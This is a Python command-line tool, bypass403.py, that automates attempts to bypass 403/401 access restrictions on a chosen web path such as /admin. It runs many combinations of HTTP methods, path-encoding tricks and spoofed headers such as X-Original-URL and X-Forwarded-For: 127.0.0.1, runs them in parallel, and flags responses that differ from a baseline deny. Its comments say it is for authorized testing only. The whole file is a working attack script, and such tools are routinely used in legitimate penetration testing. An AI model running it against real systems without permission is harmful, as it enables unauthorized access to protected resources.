#!/usr/bin/env python3
"""
bypass403.py
------------
403/401 access-control bypass tester.

Upgrades over the original version:
  - Baseline request first, so "success" is compared against the real
    403/401 body (kills false positives from custom error pages that
    return 200 anyway).
  - Concurrency via ThreadPoolExecutor (was fully sequential before).
  - Rate limiting / delay flag to avoid tripping WAF or hammering the target.
  - Results saved to JSON for later diffing / reporting.
  - Response-length + content-similarity check to flag likely false positives.
  - Only for use against targets you are authorized to test.

Usage:
    python3 bypass403.py -u https://target.com -p /admin
    python3 bypass403.py -u https://target.com -p /admin --threads 10 --delay 0.3
    python3 bypass403.py -u https://target.com -p /admin --output results.json
"""

import argparse
import json
import sys
import time
import difflib
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class BypassTester:
    def __init__(self, base_url, path, threads=5, delay=0.0, verify_ssl=True, timeout=15):
        self.base_url = base_url
        self.path = path
        self.threads = threads
        self.delay = delay
        self.verify_ssl = verify_ssl
        self.timeout = timeout
        self.successful_bypasses = []
        self.baseline = None
        self.common_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
        }

    def get_baseline(self):
        """Hit the target path with no tricks to know what a 'real' deny looks like."""
        url = urljoin(self.base_url, self.path)
        try:
            r = requests.get(url, headers=self.common_headers, timeout=self.timeout,
                              verify=self.verify_ssl, allow_redirects=False)
            self.baseline = {"status": r.status_code, "length": len(r.content), "body": r.text}
            print(f"[*] Baseline: {r.status_code} ({len(r.content)} bytes)")
        except Exception as e:
            print(f"[-] Could not fetch baseline: {e}")
            self.baseline = {"status": None, "length": 0, "body": ""}

    def generate_test_cases(self):
        test_cases = []
        methods = ["GET", "POST", "OPTIONS", "HEAD"]  # trimmed noisy PUT/DELETE/PATCH by default

        path_variations = [
            self.path,
            self.path + "/",
            self.path + "//",
            self.path + "/.",
            self.path + "/./",
            self.path + "/..;/",
            self.path + "%20",
            self.path + "%09",
            self.path + "?",
            self.path + "??",
            self.path + ".json",
            self.path + "%2e/" + self.path.split("/")[-1],
            "/%2e%2e" + self.path,
            self.path + "~",
            self.path.upper(),
            "/" + self.path.strip("/") + "/",
        ]

        header_variations = [
            {},
            {"X-Original-URL": self.path},
            {"X-Rewrite-URL": self.path},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-For": "localhost"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"Referer": self.base_url},
        ]

        for method in methods:
            for path_var in path_variations:
                for header_var in header_variations:
                    full_url = urljoin(self.base_url, path_var)
                    headers = {**self.common_headers, **header_var}
                    if method in ("POST", "PUT", "PATCH"):
                        headers["Content-Type"] = "application/x-www-form-urlencoded"
                    test_cases.append({"method": method, "url": full_url, "headers": headers})
        return test_cases

    def _is_real_bypass(self, resp_text, resp_status, resp_len):
        """Compare against baseline to filter false positives."""
        if self.baseline["status"] is not None and resp_status == self.baseline["status"]:
            return False
        if self.baseline["length"] and abs(resp_len - self.baseline["length"]) < 5:
            similarity = difflib.SequenceMatcher(None, resp_text[:2000], self.baseline["body"][:2000]).ratio()
            if similarity > 0.95:
                return False
        return True

    def _test_one(self, case):
        try:
            r = requests.request(
                method=case["method"], url=case["url"], headers=case["headers"],
                timeout=self.timeout, allow_redirects=False, verify=self.verify_ssl,
            )
            if self.delay:
                time.sleep(self.delay)

            if r.status_code not in (401, 403, 404) and self._is_real_bypass(r.text, r.status_code, len(r.content)):
                return {
                    "method": case["method"], "url": case["url"], "headers": case["headers"],
                    "status": r.status_code, "length": len(r.content),
                }
        except Exception as e:
            return {"error": str(e), "method": case["method"], "url": case["url"]}
        return None

    def run(self):
        self.get_baseline()
        test_cases = self.generate_test_cases()
        print(f"[*] Running {len(test_cases)} test cases with {self.threads} threads...")

        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futures = {pool.submit(self._test_one, case): case for case in test_cases}
            for future in as_completed(futures):
                result = future.result()
                if result and "error" not in result:
                    self.successful_bypasses.append(result)
                    print(f"[+] Bypass: {result['status']} {result['method']} {result['url']}")

    def report(self, output_file=None):
        print(f"\n[+] {len(self.successful_bypasses)} potential bypass(es) found")
        for idx, b in enumerate(self.successful_bypasses, 1):
            print(f"\n{idx}. {b['method']} {b['url']} -> {b['status']} ({b['length']} bytes)")
            for k, v in b["headers"].items():
                print(f"   {k}: {v}")

        if output_file:
            with open(output_file, "w") as f:
                json.dump({"baseline": self.baseline, "bypasses": self.successful_bypasses}, f, indent=2)
            print(f"\n[*] Results saved to {output_file}")


def main():
    parser = argparse.ArgumentParser(description="403/401 Access Control Bypass Tester (authorized testing only)")
    parser.add_argument("-u", "--url", required=True, help="Base URL, e.g. https://target.com")
    parser.add_argument("-p", "--path", required=True, help="Restricted path to test, e.g. /admin")
    parser.add_argument("--threads", type=int, default=5, help="Concurrent workers (default: 5)")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay in seconds between each request (rate limiting)")
    parser.add_argument("--no-verify-ssl", action="store_true", help="Disable SSL verification")
    parser.add_argument("--output", "-o", help="Save results as JSON to this path")
    args = parser.parse_args()

    print(f"[*] Target: {args.url}{args.path}")
    print("[!] Only run this against targets you are authorized to test.\n")

    tester = BypassTester(args.url, args.path, threads=args.threads, delay=args.delay,
                           verify_ssl=not args.no_verify_ssl)
    try:
        tester.run()
    except KeyboardInterrupt:
        print("\n[-] Interrupted by user.")
        sys.exit(1)

    tester.report(args.output)


if __name__ == "__main__":
    main()
